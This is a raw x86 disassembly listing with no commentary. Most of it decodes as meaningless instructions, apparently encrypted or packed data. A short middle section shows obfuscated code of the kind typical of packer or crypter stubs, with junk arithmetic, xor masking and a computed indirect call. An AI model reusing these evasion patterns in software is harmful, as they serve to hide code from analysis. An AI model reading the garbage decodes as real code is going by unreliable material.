  40cd3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd3e:	sbb    ebx,DWORD PTR [ecx+0x679b04c6]
  40cd44:	ret    0x1cc3
  40cd47:	jns    0x40cd88
  40cd49:	mov    WORD PTR [eax+ebx*1+0x22],ss
  40cd4d:	mov    ebp,0x1736070e
  40cd52:	mov    eax,ds:0x93e4beb0
  40cd57:	div    bh
  40cd59:	mov    dl,0xed
  40cd5b:	xor    DWORD PTR [esi-0x3d472f47],ebp
  40cd61:	es dec esp
  40cd63:	mov    bl,0x3c
  40cd65:	cmp    al,0xd8
  40cd67:	arpl   WORD PTR [eax+0x5],ax
  40cd6a:	out    dx,al
  40cd6b:	(bad)  
  40cd6c:	fcom   DWORD PTR [eax+0x58]
  40cd6f:	enter  0xadf1,0x9d
  40cd73:	popa   
  40cd74:	inc    esp
  40cd75:	fild   WORD PTR [ecx+esi*1-0x67c9b485]
  40cd7c:	pop    ebp
  40cd7d:	js     0x40cde0
  40cd7f:	xchg   esi,eax
  40cd80:	pop    esi
  40cd81:	push   esi
  40cd82:	jge    0x40cd9b
  40cd84:	pop    esp
  40cd85:	inc    edi
  40cd86:	and    BYTE PTR [edx],ch
  40cd88:	jp     0x40cd5a
  40cd8a:	dec    DWORD PTR [edx-0x66bd1719]
  40cd90:	pop    ss
  40cd91:	cdq    
  40cd92:	clc    
  40cd93:	call   0x2bc2:0x8a092c7a
  40cd9a:	push   edx
  40cd9b:	mov    edx,0x477c96b1
  40cda0:	arpl   WORD PTR [esi+0x4b74b185],bx
  40cda6:	xor    al,0xb6
  40cda8:	pop    edx
  40cda9:	or     al,0x27
  40cdab:	pop    eax
  40cdac:	sbb    bh,bl
  40cdae:	sub    al,0x4e
  40cdb0:	cmp    eax,0x9e29e802
  40cdb5:	sub    DWORD PTR [ebx],0x7b
  40cdb8:	shl    ch,0x8d
  40cdbb:	sub    DWORD PTR [ecx],esp
  40cdbd:	push   esi
  40cdbe:	in     al,dx
  40cdbf:	neg    BYTE PTR [ebx-0x44c4f9cd]
  40cdc5:	in     al,dx
  40cdc6:	daa    
  40cdc7:	mov    ds:0xc585a028,eax
  40cdcc:	adc    BYTE PTR [esi-0x68],ah
  40cdcf:	dec    ecx
  40cdd0:	push   cs
  40cdd1:	xchg   esp,eax
  40cdd2:	hlt    
  40cdd3:	jecxz  0x40cda3
  40cdd5:	jl     0x40ce2e
  40cdd7:	push   0x75
  40cdd9:	mov    ebp,0xc5266112
  40cdde:	fstp   QWORD PTR [eax-0x24b66a0e]
  40cde4:	inc    edi
  40cde5:	aas    
  40cde6:	mov    WORD PTR [edx+0x68],?
  40cde9:	ins    DWORD PTR es:[edi],dx
  40cdea:	jne    0x40ce36
  40cdec:	add    ch,dh
  40cdee:	push   esi
  40cdef:	ret    
  40cdf0:	pop    esp
  40cdf1:	inc    edi
  40cdf2:	(bad)  
  40cdf3:	jmp    0x40ce59
  40cdf5:	dec    esi
  40cdf6:	sub    eax,0xb8baa96e
  40cdfb:	push   esp
  40cdfc:	test   ah,dl
  40cdfe:	shr    DWORD PTR [esi-0x28],0xd9
  40ce02:	repz push cs
  40ce04:	shld   DWORD PTR [esi+0x4dca104f],esi,cl
  40ce0b:	mov    WORD PTR [esi+eax*8+0x18],?
  40ce0f:	sbb    dh,BYTE PTR [ecx]
  40ce11:	aad    0x7c
  40ce13:	mov    eax,0x17cb1d37
  40ce18:	push   0xffffff91
  40ce1a:	push   cs
  40ce1b:	not    ch
  40ce1d:	xchg   edx,eax
  40ce1e:	popa   
  40ce1f:	adc    BYTE PTR [edi],cl
  40ce21:	push   ebx
  40ce22:	and    BYTE PTR [edx],dl
  40ce24:	mov    bl,0x55
  40ce26:	(bad)  
  40ce27:	out    dx,al
  40ce28:	and    DWORD PTR [eax],eax
  40ce2a:	cli    
  40ce2b:	jge    0x40cdd8
  40ce2d:	test   eax,0x87a13cd3
  40ce32:	and    ah,BYTE PTR [ebp-0x63852a18]
  40ce38:	cmp    BYTE PTR [edx-0x31d2dc7b],ch
  40ce3e:	pop    edx
  40ce3f:	enter  0xbd85,0xc1
  40ce43:	xor    eax,0x4d0f7961
  40ce48:	cmp    esi,ebp
  40ce4a:	neg    DWORD PTR fs:[ebx]
  40ce4d:	dec    edi
  40ce4e:	jae    0x40ce47
  40ce50:	popa   
  40ce51:	shl    DWORD PTR [esp+eiz*8],1
  40ce54:	out    0xc,eax
  40ce56:	push   edi
  40ce57:	lods   al,BYTE PTR ds:[esi]
  40ce58:	and    dh,BYTE PTR [eax+0xb]
  40ce5b:	call   0x3e97a123
  40ce60:	add    BYTE PTR [ebp-0x7c],dh
  40ce63:	dec    eax
  40ce64:	push   eax
  40ce65:	mov    al,cl
  40ce67:	das    
  40ce68:	aaa    
  40ce69:	fnstenv [eax+0x4e]
  40ce6c:	sbb    eax,0xb5a6db0
  40ce71:	dec    eax
  40ce72:	mov    cl,0x44
  40ce74:	pop    edx
  40ce75:	push   0x35
  40ce77:	jne    0x40ce90
  40ce79:	jne    0x40ce81
  40ce7b:	mov    ds:0x8322a39d,eax
  40ce80:	adc    ch,ch
  40ce82:	iret   
  40ce83:	dec    ebx
  40ce84:	into   
  40ce85:	imul   ebx,DWORD PTR [edx],0xe30faeba
  40ce8b:	stos   DWORD PTR es:[edi],eax
  40ce8c:	mov    ch,0xfe
  40ce8e:	add    DWORD PTR [edi+0x7ec94cc6],0x2d
  40ce95:	int3   
  40ce96:	cs xchg esp,eax
  40ce98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce99:	mov    al,ds:0xa4941d4a
  40ce9e:	aas    
  40ce9f:	cdq    
  40cea0:	out    dx,al
  40cea1:	ss push edi
  40cea3:	mov    bl,0xfd
  40cea5:	adc    DWORD PTR [edx+0x10],edx
  40cea8:	adc    eax,DWORD PTR fs:[edi-0x4f]
  40ceac:	sbb    al,0xba
  40ceae:	jg     0x40ceb9
  40ceb0:	pop    edi
  40ceb1:	push   ecx
  40ceb2:	adc    eax,0x6054caaa
  40ceb7:	ror    BYTE PTR [ebx+0x34968199],1
  40cebd:	mov    ah,0x69
  40cebf:	inc    ebp
  40cec0:	xor    BYTE PTR [ecx-0xbdd7eb9],cl
  40cec6:	arpl   WORD PTR [edi],si
  40cec8:	aam    0x48
  40ceca:	rol    DWORD PTR [edx+0x681048a1],cl
  40ced0:	cmp    ah,cl
  40ced2:	pop    esp
  40ced3:	hlt    
  40ced4:	(bad)  
  40ced5:	dec    ecx
  40ced6:	out    dx,eax
  40ced7:	std    
  40ced8:	lock into 
  40ceda:	pop    eax
  40cedb:	xlat   BYTE PTR ds:[ebx]
  40cedc:	push   0xb89cd24d
  40cee1:	inc    ebx
  40cee2:	jb     0x40ce83
  40cee4:	and    eax,0x8f8e617d
  40cee9:	test   al,0x8b
  40ceeb:	pop    esp
  40ceec:	sbb    eax,0xcafd3cb1
  40cef1:	shl    BYTE PTR [ebx],0x35
  40cef4:	cmp    eax,ebx
  40cef6:	pop    edx
  40cef7:	jmp    FWORD PTR [ecx-0x34787dca]
  40cefd:	dec    BYTE PTR [esi-0x7d5451b7]
  40cf03:	out    0x2a,al
  40cf05:	rol    BYTE PTR [edi-0xc],cl
  40cf08:	push   cs
  40cf09:	sbb    BYTE PTR [ebp+0x74d25f04],bl
  40cf0f:	cmp    al,0x62
  40cf11:	jne    0x40cee1
  40cf13:	retw   0x1215
  40cf17:	dec    eax
  40cf18:	pop    ecx
  40cf19:	mov    esp,0x9ba39d0
  40cf1e:	inc    esp
  40cf1f:	push   ds
  40cf20:	cwde   
  40cf21:	test   eax,0x47caa391
  40cf26:	icebp  
  40cf27:	(bad)  
  40cf28:	mov    bh,0x56
  40cf2a:	cmp    ah,dh
  40cf2c:	ins    BYTE PTR es:[edi],dx
  40cf2d:	sbb    esp,DWORD PTR [ebx-0x616cbefe]
  40cf33:	(bad)  
  40cf34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf35:	jp     0x40cfb2
  40cf37:	xor    al,0xe0
  40cf39:	and    al,BYTE PTR [ecx-0x31]
  40cf3c:	scas   al,BYTE PTR es:[edi]
  40cf3d:	inc    esi
  40cf3e:	mov    BYTE PTR [ecx],dl
  40cf40:	shl    BYTE PTR [edx+0x32],1
  40cf43:	or     al,ch
  40cf45:	mov    BYTE PTR [eax],ch
  40cf47:	push   bx
  40cf49:	jbe    0x40cf70
  40cf4b:	lods   eax,DWORD PTR ds:[esi]
  40cf4c:	adc    eax,0x30c03f13
  40cf51:	inc    esp
  40cf52:	sar    BYTE PTR [edx+0x287ac73],cl
  40cf58:	jecxz  0x40cfd2
  40cf5a:	dec    ecx
  40cf5b:	or     DWORD PTR [edi-0x2a013e3],edi
  40cf61:	push   ebp
  40cf62:	push   es
  40cf63:	enter  0xec52,0xad
  40cf67:	dec    eax
  40cf68:	mov    ebp,0x37dc1317
  40cf6d:	int3   
  40cf6e:	imul   eax,DWORD PTR [ebx+0x34bc9d31],0xffffffdf
  40cf75:	jecxz  0x40cf7c
  40cf77:	mov    al,0x31
  40cf79:	pusha  
  40cf7a:	add    al,0x7
  40cf7c:	push   0xffffff8a
  40cf7e:	lods   eax,DWORD PTR ds:[esi]
  40cf7f:	or     BYTE PTR [eax+0x3],bl
  40cf82:	into   
  40cf83:	(bad)  
  40cf85:	call   0x87b8:0x3bc3a98a
  40cf8c:	xchg   ebp,ebp
  40cf8e:	add    BYTE PTR [ecx+0x41],0x5d
  40cf92:	pop    edx
  40cf93:	dec    ebx
  40cf94:	js     0x40cffc
  40cf96:	pop    edi
  40cf97:	iret   
  40cf98:	sub    eax,0x1cdc1b15
  40cf9d:	cdq    
  40cf9e:	or     ch,bh
  40cfa0:	jg     0x40d00f
  40cfa2:	retf   0x3a4b
  40cfa5:	and    eax,0xc92bab7c
  40cfaa:	aaa    
  40cfab:	dec    edx
  40cfac:	fistp  DWORD PTR [esi]
  40cfae:	stos   DWORD PTR es:[edi],eax
  40cfaf:	jae    0x40d00c
  40cfb1:	call   0x557ca0e3
  40cfb6:	inc    ebp
  40cfb7:	or     al,0x6c
  40cfb9:	xlat   BYTE PTR ds:[ebx]
  40cfba:	dec    eax
  40cfbb:	inc    ebx
  40cfbc:	lea    ebx,[edx-0xd]
  40cfbf:	outs   dx,BYTE PTR ds:[esi]
  40cfc0:	push   edi
  40cfc1:	or     BYTE PTR [eax+ebx*2+0x63],dl
  40cfc5:	jl     0x40cfc7
  40cfc7:	(bad)  
  40cfc8:	push   eax
  40cfc9:	stos   BYTE PTR es:[edi],al
  40cfca:	dec    eax
  40cfcb:	push   ecx
  40cfcc:	jecxz  0x40d04b
  40cfce:	jbe    0x40cf5b
  40cfd0:	xchg   BYTE PTR [ebp-0x76784ea5],ch
  40cfd6:	loopne 0x40cf69
  40cfd8:	mov    ecx,0x9f8645dc
  40cfdd:	sbb    eax,0x934bc237
  40cfe2:	(bad)
  40cfe5:	or     eax,0xb164c2b1
  40cfea:	cli    
  40cfeb:	lock or al,0x79
  40cfee:	mov    al,ds:0x8c7e0317
  40cff3:	xor    DWORD PTR [esi-0x646d47cc],edi
  40cff9:	aaa    
  40cffa:	lea    ecx,[ebx+0x70f6f006]
  40d000:	out    dx,al
  40d001:	push   cs
  40d002:	loop   0x40d02b
  40d004:	xchg   BYTE PTR [edx],cl
  40d006:	xor    ebx,esp
  40d008:	leave  
  40d009:	sub    edi,DWORD PTR [ecx]
  40d00b:	call   0x118f:0x917de45d
  40d012:	stos   BYTE PTR es:[edi],al
  40d013:	in     eax,0x7b
  40d015:	pop    esp
  40d016:	cdq    
  40d017:	aam    0x16
  40d019:	push   ds
  40d01a:	push   ecx
  40d01b:	push   edi
  40d01c:	stos   DWORD PTR es:[edi],eax
  40d01d:	icebp  
  40d01e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d01f:	jb     0x40d08b
  40d021:	cmp    DWORD PTR [ebp+ecx*2+0x21],edi
  40d025:	pop    ds
  40d026:	ror    BYTE PTR ds:0xee0787c3,cl
  40d02c:	test   eax,0x342476ea
  40d031:	mov    DWORD PTR [ebx-0x5d],ebx
  40d034:	getsec 
  40d036:	mov    BYTE PTR [eax],ch
  40d038:	inc    esi
  40d039:	clc    
  40d03a:	test   eax,0x10147464
  40d03f:	mov    bh,0x71
  40d041:	cmp    eax,0x7e83f649
  40d046:	pop    ecx
  40d047:	outs   dx,DWORD PTR ds:[esi]
  40d048:	(bad)  
  40d049:	loop   0x40cfec
  40d04b:	jg     0x40d033
  40d04d:	cmp    eax,0x22b0e3ba
  40d052:	pop    edi
  40d053:	adc    dl,dl
  40d055:	mov    ch,0x3d
  40d057:	mov    ebp,0xb01bfa04
  40d05c:	js     0x40d076
  40d05e:	mov    dl,0xe7
  40d060:	or     esi,DWORD PTR [esi]
  40d062:	clc    
  40d063:	push   ebx
  40d064:	dec    edi
  40d065:	add    edi,DWORD PTR [eax+0x76]
  40d068:	ins    DWORD PTR es:[edi],dx
  40d069:	jmp    0x98f1:0xf1eb6b52
  40d070:	inc    BYTE PTR [esi]
  40d072:	in     eax,0x7a
  40d074:	push   ebx
  40d075:	mov    ds,WORD PTR [esi+ecx*1+0x60]
  40d079:	das    
  40d07a:	push   0xffffffb5
  40d07c:	(bad)  
  40d07d:	xchg   esi,eax
  40d07e:	jne    0x40d0d8
  40d080:	(bad)  
  40d081:	cdq    
  40d082:	sub    al,0x92
  40d084:	mov    cl,BYTE PTR [ecx-0x7]
  40d087:	dec    esi
  40d088:	dec    ebx
  40d089:	adc    DWORD PTR [ebx],ebx
  40d08b:	xchg   ebp,eax
  40d08c:	loop   0x40d072
  40d08e:	jae    0x40d0e7
  40d090:	xchg   ah,dh
  40d092:	es adc al,0x16
  40d095:	mov    bh,0x50
  40d097:	or     eax,0x9511d0e0
  40d09c:	inc    al
  40d09e:	das    
  40d09f:	les    esi,FWORD PTR [edi]
  40d0a1:	sbb    DWORD PTR [edx-0x5e84fbfc],0x4b
  40d0a8:	pop    ds
  40d0a9:	push   edi
  40d0aa:	fcomip st,st(3)
  40d0ac:	div    edx
  40d0ae:	mov    eax,ds:0x8ab9e525
  40d0b3:	scas   al,BYTE PTR es:[edi]
  40d0b4:	fnsave [esi+esi*4-0x50e4803a]
  40d0bb:	mov    eax,ds:0xad392e32
  40d0c0:	lods   al,BYTE PTR ds:[esi]
  40d0c1:	adc    esi,DWORD PTR [ecx]
  40d0c3:	jmp    0xbc19:0x7ffde1df
  40d0ca:	shl    BYTE PTR [edi+0x10ba54d5],0x97
  40d0d1:	xor    eax,0x8c5093dc
  40d0d6:	pop    ds
  40d0d7:	jbe    0x40d114
  40d0d9:	int3   
  40d0da:	outs   dx,DWORD PTR ds:[esi]
  40d0db:	jmp    0x40d109
  40d0dd:	imul   ebp,DWORD PTR [edi-0x1f3be53e],0x4c
  40d0e4:	sar    BYTE PTR [ecx],0xe6
  40d0e7:	jmp    0xf7bae956
  40d0ec:	and    al,BYTE PTR [ecx-0x78]
  40d0ef:	test   al,0x55
  40d0f1:	lods   eax,DWORD PTR ds:[esi]
  40d0f2:	pop    esi
  40d0f3:	out    dx,eax
  40d0f4:	fisttp QWORD PTR [edi]
  40d0f6:	mov    edi,0x403d7f0f
  40d0fb:	cmp    dh,ch
  40d0fd:	cli    
  40d0fe:	or     DWORD PTR [ebx+ebp*4-0xc51783d],edx
  40d105:	out    dx,eax
  40d106:	mov    ebx,0xbf1e8902
  40d10b:	mov    ds:0xd7dfad,eax
  40d110:	rcl    ebp,0x78
  40d113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d114:	mov    edi,0x62a9bb6a
  40d119:	stc    
  40d11a:	push   ebx
  40d11b:	icebp  
  40d11c:	jne    0x40d160
  40d11e:	or     al,0x5e
  40d120:	(bad)  
  40d121:	mov    eax,0x31c358c2
  40d126:	scas   eax,DWORD PTR es:[edi]
  40d127:	mov    ebp,0xf1b2776
  40d12c:	or     al,cl
  40d12e:	test   edx,ebp
  40d130:	into   
  40d131:	int    0x2a
  40d133:	fwait
  40d134:	stc    
  40d135:	or     al,BYTE PTR [edx-0x3d]
  40d138:	imul   esp,DWORD PTR [eax],0x20
  40d13b:	stos   BYTE PTR es:[edi],al
  40d13c:	adc    DWORD PTR [ebp+edi*2-0x43],0x30
  40d141:	push   eax
  40d142:	aaa    
  40d143:	push   ebx
  40d144:	sahf   
  40d145:	pop    esi
  40d146:	sbb    ah,ah
  40d148:	push   edi
  40d149:	pop    ebx
  40d14a:	mov    eax,0xf7510cf1
  40d14f:	mov    edi,0x11eba11c
  40d154:	clc    
  40d155:	pop    ss
  40d156:	(bad)  
  40d157:	aad    0x33
  40d159:	mov    dh,0x58
  40d15b:	pop    esp
  40d15c:	test   eax,0x26757822
  40d161:	xchg   edi,eax
  40d162:	ret    0x8a13
  40d165:	div    bl
  40d167:	and    al,0x3f
  40d169:	mov    eax,0x76bfdb6a
  40d16e:	and    bh,BYTE PTR [eax+0x2562c94a]
  40d174:	inc    ebp
  40d175:	gs int3 
  40d177:	sar    edi,cl
  40d179:	sbb    edx,DWORD PTR [edx+ebx*4-0x13]
  40d17d:	cwde   
  40d17e:	mov    cl,0xb1
  40d180:	es repz pop esp
  40d183:	shl    DWORD PTR [ebp+0x26],0x1
  40d187:	or     DWORD PTR [ebx],ebx
  40d189:	xchg   esi,eax
  40d18a:	scas   eax,DWORD PTR es:[edi]
  40d18b:	out    0x4f,al
  40d18d:	scas   eax,DWORD PTR es:[edi]
  40d18e:	cmp    eax,0xad00f05e
  40d193:	xchg   ecx,eax
  40d194:	dec    dl
  40d196:	add    al,BYTE PTR [eax-0x27e59c05]
  40d19c:	jmp    0x1b3fbb7e
  40d1a1:	outs   dx,DWORD PTR ds:[esi]
  40d1a2:	mov    ds:0xc87397c6,eax
  40d1a7:	dec    ebp
  40d1a8:	xor    ecx,esi
  40d1aa:	cmp    edi,DWORD PTR [eax-0x61]
  40d1ad:	mov    edx,0xc9d30c43
  40d1b2:	push   0x1e
  40d1b4:	mov    dl,0x65
  40d1b6:	bound  ebp,QWORD PTR [edi]
  40d1b8:	sar    DWORD PTR [edx+ebx*2+0x1],cl
  40d1bc:	dec    ebx
  40d1bd:	scas   al,BYTE PTR es:[edi]
  40d1be:	jo     0x40d1cc
  40d1c0:	pop    ebp
  40d1c1:	mov    dl,0x70
  40d1c3:	add    eax,0x812bcdb5
  40d1c8:	mov    dh,0xa7
  40d1ca:	sub    bl,BYTE PTR [eax]
  40d1cc:	sbb    al,0xd6
  40d1ce:	pop    es
  40d1cf:	sbb    DWORD PTR [edi],ebx
  40d1d1:	mov    ds:0xd7359edd,eax
  40d1d6:	jo     0x40d24e
  40d1d8:	sahf   
  40d1d9:	(bad)  
  40d1da:	out    0x13,al
  40d1dc:	push   edx
  40d1dd:	and    edx,DWORD PTR [ebp+0x27]
  40d1e0:	int3   
  40d1e1:	inc    eax
  40d1e2:	mov    dl,0x2f
  40d1e4:	fmul   DWORD PTR [edx+0x61]
  40d1e7:	mov    edx,edx
  40d1e9:	lahf   
  40d1ea:	pop    esi
  40d1eb:	adc    eax,0xc926156d
  40d1f0:	cmc    
  40d1f1:	cli    
  40d1f2:	shr    ebx,1
  40d1f4:	mov    dl,0xf5
  40d1f6:	mov    dh,0xb2
  40d1f8:	das    
  40d1f9:	push   ecx
  40d1fa:	jle    0x40d1d3
  40d1fc:	mov    al,ds:0xbbe297e0
  40d201:	hlt    
  40d202:	push   ebx
  40d203:	hlt    
  40d204:	jnp    0x40d222
  40d206:	jno    0x40d1d2
  40d208:	jns    0x40d252
  40d20a:	xor    al,0x7e
  40d20c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d20d:	add    DWORD PTR [ebp-0x58],esi
  40d210:	jle    0x40d1c9
  40d212:	leave  
  40d213:	mov    cs,WORD PTR [ecx-0x6456b2bb]
  40d219:	test   BYTE PTR [esp+ebp*2+0x14],al
  40d21d:	shl    DWORD PTR [eax-0x10f91f05],cl
  40d223:	mov    ecx,0xaf242e40
  40d228:	adc    ebx,DWORD PTR [eax]
  40d22a:	fmul   DWORD PTR ds:0x68ef119d
  40d230:	sbb    al,0xb6
  40d232:	pop    ebp
  40d233:	out    0x1,al
  40d235:	cli    
  40d236:	(bad)  
  40d237:	or     eax,0xa6b22278
  40d23c:	dec    ebp
  40d23d:	jno    0x40d2a2
  40d23f:	fiadd  DWORD PTR [ecx+ebx*8]
  40d242:	popf   
  40d243:	sbb    ecx,ebp
  40d245:	dec    esi
  40d246:	cwde   
  40d247:	pop    ebp
  40d248:	mov    cl,0x91
  40d24a:	enter  0x5aef,0x45
  40d24e:	pop    esp
  40d24f:	push   ds
  40d250:	push   esi
  40d251:	add    eax,0xaf828d5a
  40d256:	jno    0x40d29c
  40d258:	daa    
  40d259:	shl    DWORD PTR fs:[edi],cl
  40d25c:	jp     0x40d205
  40d25e:	mov    ah,al
  40d260:	sbb    BYTE PTR [edi+0x663a8351],cl
  40d266:	rcr    bl,0x79
  40d269:	aaa    
  40d26a:	cli    
  40d26b:	pusha  
  40d26c:	xor    cl,bh
  40d26e:	mov    ebp,0x5266e3ff
  40d273:	add    eax,DWORD PTR [ecx-0x21]
  40d276:	aad    0xbd
  40d278:	add    eax,0x8b4b6b6e
  40d27d:	mov    ds:0x47d687d2,al
  40d282:	(bad)  
  40d283:	jle    0x40d20a
  40d285:	push   es
  40d286:	int    0xe0
  40d288:	cmp    eax,DWORD PTR [ecx]
  40d28a:	les    esi,FWORD PTR [esp+ebx*1-0x6e2cbe93]
  40d291:	aaa    
  40d292:	daa    
  40d293:	cmp    ah,BYTE PTR [edi-0x74b18c50]
  40d299:	inc    ebp
  40d29a:	in     al,0x85
  40d29c:	ror    BYTE PTR [edi],0x84
  40d29f:	xchg   esi,eax
  40d2a0:	add    BYTE PTR [eax],al
  40d2a2:	add    bh,al
  40d2a4:	inc    ebp
  40d2a5:	loopne 0x40d2a7
  40d2a7:	add    BYTE PTR [eax],al
  40d2a9:	add    BYTE PTR [edx+0x58],dl
  40d2ac:	push   0x5
  40d2ae:	sub    edx,eax
  40d2b0:	pop    edx
  40d2b1:	add    edx,0xa
  40d2b4:	push   edx
  40d2b5:	pop    ecx
  40d2b6:	push   0xa
  40d2b8:	dec    ecx
  40d2b9:	pop    ebx
  40d2ba:	dec    ebx
  40d2bb:	xchg   ebx,ecx
  40d2bd:	sub    ebx,ecx
  40d2bf:	xchg   ebx,ecx
  40d2c1:	dec    ecx
  40d2c2:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2c5:	imul   eax,ecx
  40d2c8:	sub    esp,eax
  40d2ca:	mov    DWORD PTR [ebp-0x20],esp
  40d2cd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2d0:	xor    eax,esi
  40d2d2:	add    eax,edi
  40d2d4:	jmp    0x40d312
  40d2d9:	mov    ecx,DWORD PTR [ebp-0xc]
  40d2dc:	mov    eax,DWORD PTR [ebp+0x8]
  40d2df:	mov    edx,DWORD PTR [ebp+0x14]
  40d2e2:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d2e6:	xor    ecx,esi
  40d2e8:	add    ecx,edi
  40d2ea:	xor    edx,edx
  40d2ec:	div    ecx
  40d2ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2f1:	xor    ecx,esi
  40d2f3:	lea    eax,[ecx+eax*1+0x3272fa]
  40d2fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d2fd:	mov    edx,DWORD PTR [ebp-0x20]
  40d300:	mov    DWORD PTR [edx+ecx*4],eax
  40d303:	mov    eax,DWORD PTR [ebp-0xc]
  40d306:	mov    ecx,DWORD PTR [ebp+0x8]
  40d309:	xor    eax,esi
  40d30b:	lea    eax,[eax+ecx*1+0x3272fa]
  40d312:	mov    DWORD PTR [ebp+0x8],eax
  40d315:	mov    eax,DWORD PTR [ebp-0xc]
  40d318:	mov    ecx,DWORD PTR [ebp+0x14]
  40d31b:	xor    eax,esi
  40d31d:	add    eax,edi
  40d31f:	imul   eax,DWORD PTR [ecx]
  40d322:	mov    ecx,DWORD PTR [ebp-0x4]
  40d325:	mov    edx,DWORD PTR [ebp+0x8]
  40d328:	xor    ecx,esi
  40d32a:	lea    ecx,[ecx+edx*1+0x3272fa]
  40d331:	cmp    ecx,eax
  40d333:	jne    0x40d2d9
  40d339:	mov    eax,DWORD PTR [ebp-0x4]
  40d33c:	xor    eax,esi
  40d33e:	add    eax,edi
  40d340:	mov    DWORD PTR [ebp-0x10],eax
  40d343:	and    ebx,0x6547647
  40d349:	xor    ebx,0x8768765
  40d34f:	xchg   ebx,esi
  40d351:	xor    ebx,ebx
  40d353:	push   esi
  40d354:	mov    esi,ebx
  40d356:	pop    ebx
  40d357:	mov    edx,esi
  40d359:	add    ebx,0x1002
  40d35f:	lea    eax,[ebp-0x18]
  40d362:	add    edx,eax
  40d364:	add    edx,0x5
  40d367:	push   edx
  40d368:	inc    esi
  40d369:	pop    ecx
  40d36a:	dec    ecx
  40d36b:	xchg   ecx,eax
  40d36c:	dec    eax
  40d36d:	xchg   ecx,eax
  40d36e:	dec    ecx
  40d36f:	xchg   ecx,edx
  40d371:	dec    edx
  40d372:	push   edx
  40d373:	mov    edx,ebx
  40d375:	pop    ebx
  40d376:	dec    ebx
  40d377:	call   DWORD PTR [ebx]
  40d379:	cmp    DWORD PTR [ebp+0x10],esi
  40d37c:	je     0x40d39d
  40d382:	xchg   edx,eax
  40d383:	push   0xc
  40d385:	pop    ecx
  40d386:	dec    ecx
  40d387:	push   0x3
  40d389:	pop    ebx
  40d38a:	inc    ebx
  40d38b:	xchg   ebx,ecx
  40d38d:	inc    ecx
  40d38e:	sub    ebx,ecx
  40d390:	xchg   ebx,ecx
  40d392:	dec    ecx
  40d393:	dec    ecx
  40d394:	mov    eax,DWORD PTR [ebp-0x1c]
  40d397:	imul   eax,ecx
  40d39a:	add    esp,eax
  40d39c:	xchg   edx,eax
  40d39d:	push   eax
  40d39e:	xor    ebx,ebx
  40d3a0:	mov    edx,esp
  40d3a2:	dec    edx
  40d3a3:	inc    ebx
  40d3a4:	add    ebx,DWORD PTR [edx+ebx*1]
  40d3a7:	dec    ebx
  40d3a8:	xor    edx,edx
  40d3aa:	add    DWORD PTR [ebp-0x10],ebx
  40d3ad:	pop    ebx
  40d3ae:	mov    eax,DWORD PTR [ebp-0x10]
  40d3b1:	pop    edi
  40d3b2:	pop    esi
  40d3b3:	pop    ebx
  40d3b4:	leave  
  40d3b5:	ret    0x10
  40d3b8:	push   ebp
  40d3b9:	mov    ebp,esp
  40d3bb:	push   ecx
  40d3bc:	or     DWORD PTR ds:0x426f29,0x4a1b
  40d3c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40d3cd:	movzx  edx,BYTE PTR ds:0x426f19
  40d3d4:	sub    DWORD PTR ds:0x426f21,edx
  40d3da:	mov    eax,DWORD PTR [ebp-0x4]
  40d3dd:	mov    DWORD PTR ds:0x426e91,0x1a
  40d3e7:	cmp    DWORD PTR ds:0x426e91,0x0
  40d3ee:	je     0x40d421
  40d3f4:	cmp    DWORD PTR ds:0x426e91,0x24
  40d3fb:	jl     0x40d421
  40d401:	jmp    0x40d40f
  40d406:	push   DWORD PTR [ebp-0xc]
  40d409:	call   DWORD PTR ds:0x430a2c
  40d40f:	mov    edx,DWORD PTR ds:0x426e91
  40d415:	dec    edx
  40d416:	mov    DWORD PTR ds:0x426e91,edx
  40d41c:	jmp    0x40d3e7
  40d421:	mov    edx,DWORD PTR [ebp+0x10]
  40d424:	xor    ecx,0x6edc
  40d42a:	jmp    0x40f7c6
  40d42f:	mov    ah,0x4a
  40d431:	hlt    
  40d432:	mov    ebx,0x74b46574
  40d437:	ja     0x40d48b
  40d439:	out    dx,al
  40d43a:	je     0x40d3ea
  40d43c:	sub    dh,BYTE PTR [eax+0x37]
  40d43f:	sbb    ch,BYTE PTR [edx]
  40d441:	jnp    0x40d4be
  40d443:	clc    
  40d444:	pushf  
  40d445:	jnp    0x40d4c2
  40d447:	std    
  40d448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d449:	sbb    DWORD PTR [ebp-0x2cc393ac],ebx
  40d44f:	out    dx,eax
  40d450:	sbb    ebp,DWORD PTR ds:0x2ba78726
  40d456:	xchg   edx,eax
  40d457:	clc    
  40d458:	xlat   BYTE PTR ds:[ebx]
  40d459:	mov    esp,0xa16f461b
  40d45e:	mov    BYTE PTR [ecx+edx*1+0x2a],dh
  40d462:	cli    
  40d463:	dec    edx
  40d464:	add    eax,DWORD PTR [edi-0x62517d68]
  40d46a:	mov    ecx,0xc67df132
  40d46f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d470:	(bad)  
  40d471:	pop    ds
  40d472:	xchg   BYTE PTR [ebx+0x2969c0db],dh
  40d478:	xor    al,0x7b
  40d47a:	repnz xchg edi,eax
  40d47c:	jg     0x40d4f4
  40d47e:	cwde   
  40d47f:	imul   eax,DWORD PTR ds:0xc58de1dc,0xa25e12b6
  40d489:	dec    DWORD PTR [eax]
  40d48b:	dec    esp
  40d48c:	in     eax,0xcd
  40d48e:	out    0x97,al
  40d490:	jecxz  0x40d48a
  40d492:	inc    edx
  40d493:	int3   
  40d494:	fistp  QWORD PTR [ecx+0x4434c924]
  40d49a:	(bad)
  40d49d:	cdq    
  40d49e:	mov    al,0xb0
  40d4a0:	leave  
  40d4a1:	(bad)  
  40d4a2:	mov    al,BYTE PTR [ecx-0x58c7d2c6]
  40d4a8:	test   BYTE PTR [esi-0x4d058486],bh
  40d4ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4af:	fild   DWORD PTR [ecx-0x10]
